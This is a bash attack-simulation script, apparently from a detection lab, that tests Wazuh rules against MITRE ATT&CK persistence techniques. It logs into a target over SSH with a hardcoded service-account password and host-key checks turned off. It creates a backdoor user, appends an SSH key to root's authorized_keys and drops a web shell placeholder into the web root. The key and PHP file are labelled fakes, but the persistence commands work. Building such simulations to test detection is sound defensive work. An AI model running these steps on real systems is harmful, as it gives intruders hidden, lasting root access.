#!/bin/bash
# Scenario 4 - Valid account + persistence
# MITRE ATT&CK: T1078.003 Valid Accounts, T1136.001 Create Account,
#               T1098.004 SSH Authorized Keys, T1505.003 Web Shell
# Story: the attacker already knows the weak service-account password
# (password reuse / leaked credentials) and logs in "legitimately".
# Expect: Wazuh rules 100110, 100111, 100112, 100113 (+ stock 5402 sudo to root)
source /attacks/common.sh

banner "04 Compromise: log in with the service account and establish persistence"
info "waiting for any active-response block to expire..."
wait_for_port 22 || { info "port 22 unreachable"; exit 1; }

SSH="sshpass -p backup123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR svc-backup@$TARGET"

info "whoami / privilege check"
$SSH 'id; sudo -n true && echo "passwordless sudo: yes"'

info "create a backdoor account"
$SSH 'sudo useradd -m -s /bin/bash sysupdate 2>/dev/null; echo created: $(id -un sysupdate)'

info "plant an SSH key for root"
$SSH 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILABONLYNOTAREALKEYxxxxxxxxxxxxxxxxxxxxxxxxx attacker@lab" | sudo tee -a /root/.ssh/authorized_keys >/dev/null; echo planted'

info "drop a (harmless) web shell placeholder in the web root"
$SSH 'echo "<?php /* lab placeholder - not a working shell */ ?>" | sudo tee /var/www/html/upload.php >/dev/null; echo dropped'
